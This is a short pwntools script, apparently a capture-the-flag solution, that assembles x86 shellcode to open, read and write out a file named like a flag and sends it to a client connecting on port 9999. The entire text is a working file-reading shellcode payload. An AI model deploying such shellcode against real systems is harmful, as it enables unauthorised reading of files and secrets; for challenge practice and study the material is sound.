from pwn import *
context.log_level="debug"

code="""
    push 0x5
    pop eax
    call here
    .ascii "flagggggggggggggggg9gggggggggg9ggggggg9ggggggggggg99ggg"
    .byte 0
here:
    pop ebx
    xor ecx,ecx
    xor edx,edx
    int 0x80   /* open */

    mov ecx,0x100 /* buf */
    add ecx,ebx
    
    mov edx,0x100
    mov ebx,eax /* fd */
    mov eax,0x3
    int 0x80  /* read */

    mov ebx,0
    mov eax,0x4
    int 0x80  /* write */
    hlt
"""


l=listen(9999)
conn=l.wait_for_connection()
conn.send(asm(code,arch="x86"))
print conn.recvline()